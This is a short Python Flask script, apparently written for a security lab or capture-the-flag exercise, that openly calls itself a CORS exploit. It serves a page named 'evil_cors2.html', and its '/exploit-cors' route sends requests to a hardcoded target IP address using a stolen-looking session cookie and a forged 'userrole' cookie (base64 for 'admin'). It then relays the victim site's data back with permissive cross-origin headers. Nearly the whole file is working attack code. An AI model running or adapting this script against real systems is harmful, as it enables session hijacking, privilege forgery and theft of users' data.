from flask import Flask, request, render_template, jsonify
import requests

app = Flask(__name__, static_url_path='/static', static_folder='static')

@app.route("/")
def start():
    return render_template("evil_cors2.html")

@app.route("/exploit-cors")
def exploit_cors():
    # Include the JSESSIONID and userrole cookies in the request
    cookies = {
        'JSESSIONID': '82897F19E7BB860F67297E229542CE38',
        'userrole': 'YWRtaW4='
    }
    target_url = "http://34.38.142.16:4444/offers"
    response = fetch_data(target_url, cookies)
    return response

def fetch_data(url, cookies):
    # Perform a simple GET request to fetch data from the target website
    try:
        response = requests.get(url, cookies=cookies)
        return jsonify({"data": response.text}), 200, {'Access-Control-Allow-Origin': 'http://localhost:1337', 'Access-Control-Allow-Credentials': 'true'}
    except Exception as e:
        return f"Error: {str(e)}", 500

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=1337)


